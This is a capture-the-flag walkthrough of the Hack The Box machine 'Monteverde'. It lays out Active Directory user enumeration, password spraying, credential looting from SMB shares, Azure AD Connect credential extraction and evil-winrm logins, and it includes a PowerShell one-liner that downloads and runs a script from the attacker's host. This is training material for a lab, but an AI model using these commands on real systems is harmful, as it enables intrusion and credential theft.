---
description: https://app.hackthebox.com/machines/Monteverde
---

# 🐭 Monteverde

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So let's start by a quick nmap:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)  (26).png" alt=""><figcaption><p>TCP DNS (53) along with Kerberos (TCP 88) and LDAP (TCP 389) suggests this might be a domain controller</p></figcaption></figure>

Could not connect via SMB shares

So tried RPC on port 445:

```
rpcclient -U "" -N 10.129.69.81
querydispinfo
```

1. `rpcclient`: This is a command-line tool used to execute client-side operations on a remote system that supports RPC. It allows users to interact with services that utilize RPC for communication.
2. `-U ""`: This parameter specifies the username to use for authentication. In this case, an empty string `""` is used, which might indicate that the command is trying to connect anonymously or using a null session.
3. `-N`: This flag is used to indicate that no password should be prompted for, which typically implies anonymous authentication.
4. `10.129.69.81`: This is the IP address of the remote system to which the command is attempting to connect.
5. `querydispinfo`: This appears to be a command or operation being requested from the remote system. It could be querying display information, such as details about the available shared resources or services.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)  (14).png" alt=""><figcaption></figcaption></figure>

So we found the name of some of the users and their account name

a good way to go would be to check if the users use their name as passwords for their account

So let's try to put all the usernames in a word list and spray using crackmapexec

```
crackmapexec smb 10.129.69.81 -u users.txt -p users.txt --continue-on-success
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)   (6).png" alt=""><figcaption><p>MEGABANK.LOCAL\SABatchJobs:SABatchJobs</p></figcaption></figure>

cool we got a match&#x20;

Now let's use `smbmap` to tell me what shares there are and what I have access to in a cleaned up manner:

```
smbmap -H 10.129.69.81 -u SABatchJobs -p SABatchJobs
```

* `smbmap`: This is a command-line tool used to enumerate and interact with shares on SMB servers. It allows users to discover accessible shares, permissions, and other information available on SMB-enabled systems.
* `-H 10.129.69.81`: This parameter specifies the target host or IP address (`10.129.69.81`) of the SMB server that the `smbmap` tool will interact with. This is the remote system you want to analyze.

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) ( (8).png" alt=""><figcaption></figcaption></figure>

after some enumeration we see some interesting files:

```
smbmap -H 10.129.69.81 -u SABatchJobs -p SABatchJobs -R 'users$'
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) ( (2).png" alt=""><figcaption></figcaption></figure>

To grab it using smbclient ->

```
smbclient -U SABatchJobs //10.129.69.81/users$ SABatchJobs -c 'get mhope/azure.xml azure.xml'
```

1. `smbclient`: This is the command-line tool used to access files and services on SMB/CIFS servers.
2. `-U SABatchJobs`: This parameter specifies the username (`SABatchJobs`) to be used for authentication when connecting to the SMB/CIFS server.
3. `//10.10.10.172/users$`: This is the Uniform Naming Convention (UNC) path to the shared resource on the server (`10.10.10.172`). The `users$` represents a hidden share named `users`. The double slashes `//` indicate the beginning of a UNC path.
4. `SABatchJobs`: This is the password corresponding to the username provided with the `-U` flag. It's used for authentication purposes.
5. `-c 'get mhope/azure.xml azure.xml'`: This part of the command specifies a subcommand to be executed after connecting to the SMB/CIFS server. In this case, it's executing the `get` command to retrieve a file named `azure.xml` from the `mhope` directory on the server's `users$` share. The file will be downloaded to the local system and saved as `azure.xml`.

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Or another way of doing it:

```
smbclient -U SABatchJobs //10.129.69.81/users$ SABatchJobs
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

in the XML file, there are credentials:

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

since the credentials are in mhope directory, it's a high prob it's his credentials ->

You can check that with `crackmapexec`

```
crackmapexec winrm 10.129.69.81 -u mhope -p '4n0therD4y@n0th3r$'
```

1. `crackmapexec`: This is a penetration testing tool that is used for assessing the security of networks by identifying and exploiting vulnerabilities. It's specifically designed for enumerating and exploiting Windows hosts on a network.
2. `winrm`: This indicates that the operation being performed by `crackmapexec` pertains to WinRM, which is a management protocol used for remote management of Windows systems over HTTP(S). WinRM allows for remote execution of PowerShell commands and scripts, as well as other management tasks.
3. `10.129.69.81`: This is the IP address of the target system where the WinRM service is running. `crackmapexec` will attempt to connect to this system to perform enumeration or exploitation.
4. `-u mhope`: This flag specifies the username (`mhope`) to be used for authentication when connecting to the WinRM service on the target system.
5. `-p '4n0therD4y@n0th3r$'`: This flag specifies the password (`4n0therD4y@n0th3r$`) corresponding to the username provided with the `-u` flag. It's used for authentication purposes.

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We also get the indication that winrm works for this account so let's go:

```
evil-winrm -i 10.129.69.81 -u mhope -p '4n0therD4y@n0th3r$'
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>59f4dfa90d416cb495bd38d04f361549</p></figcaption></figure>

In the box description, we see that they talk about Azure Active Directory and there was a share "azure uploads"

When used without additional parameters, "net user mhope" displays detailed information about the specified user account, such as the account's full name, description, whether the account is active or disabled, when the account was created, and when the account's password was last set

<figure><img src="../../.gitbook/assets/image (26) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We see that mhope is part of the azure admins group

after quick enumeration we also see  that there are a lot of azure related files:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)  (25).png" alt=""><figcaption></figcaption></figure>

nice blog about azure red teaming:

{% embed url="https://blog.xpnsec.com/azuread-connect-for-redteam/" %}

We see this :

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)  (13).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c" %}

on my local machine i'll put this in an "azurePentest.ps1" file:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)   (5).png" alt=""><figcaption></figcaption></figure>

and go fetch it like that:

```
wget http://10.10.14.94:6969/azurePentest.ps1
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) ( (7).png" alt=""><figcaption></figcaption></figure>

or another way is to download it and executing it right away:&#x20;

```
iex(new-object net.webclient).downloadstring('http://10.10.14.94:6969/shell1.ps1')
```

1. `iex`: This is the alias for the `Invoke-Expression` cmdlet in PowerShell. It's used to execute commands or scripts represented as strings.
2. `(new-object net.webclient)`: This creates a new instance of the `System.Net.WebClient` class in .NET. This class provides methods for downloading data from the internet.
3. `.downloadstring('http://10.10.14.94:6969/shell1.ps1')`: This calls the `DownloadString` method of the `WebClient` object created in the previous step. It downloads the contents of the specified URL (`http://10.10.14.94:6969/shell1.ps1`) as a string.

Combining these components, the entire command can be interpreted as follows:

1. Create a new instance of the `WebClient` class.
2. Use this `WebClient` object to download the contents of the PowerShell script (`shell1.ps1`) from the specified URL (`http://10.10.14.94:6969/shell1.ps1`).
3. Execute the downloaded script using the `Invoke-Expression` cmdlet (`iex`)

<figure><img src="../../.gitbook/assets/image (620).png" alt=""><figcaption></figcaption></figure>

Script kiddie type stuff, but we get some credentials. Let's hop on WinRM:

{% content-ref url="../../interacting-with-protocols-and-tools/tools/winrm.md" %}
[winrm.md](../../interacting-with-protocols-and-tools/tools/winrm.md)
{% endcontent-ref %}

```
evil-winrm -i 10.129.69.81 -u administrator -p 'd0m@in4dminyeah!'
```

<figure><img src="../../.gitbook/assets/image (621).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (622).png" alt=""><figcaption></figcaption></figure>
